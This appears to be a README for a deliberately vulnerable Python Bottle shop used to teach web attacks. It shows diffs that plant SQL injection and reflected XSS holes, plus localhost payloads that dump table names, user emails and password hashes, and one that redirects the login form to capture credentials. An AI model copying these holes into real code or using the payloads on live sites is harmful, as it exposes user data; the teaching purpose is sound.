# bottle-store
 EC site example using Python bottle.

# SQL Injection

```diff:app.py
-results = cur.execute("SELECT * FROM rated_products WHERE name LIKE ?;", ("%" + query + "%",)).fetchall()
+results = cur.execute("SELECT * FROM rated_products WHERE name LIKE %'" + query + "%'").fetchall()
```

```
http://localhost:8080/products?q='
```

```
http://localhost:8080/products?q='--
```

```
http://localhost:8080/products?q=x%' UNION SELECT 1, tbl_name, 1, 1, 1, 1 FROM sqlite_master--
```

```
http://localhost:8080/products?q=x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--
```

# Reflected XSS

```diff:app.py
-<p style="color:red;"> {{ message }} </p>
+<p style="color:red;"> {{ !message }} </p>
```

```
http://localhost:8080/login?message=<s>hello</s>
```

```
http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
```

# Persistent XSS

# DOM based XSS

# CSRF

# Clickjucking

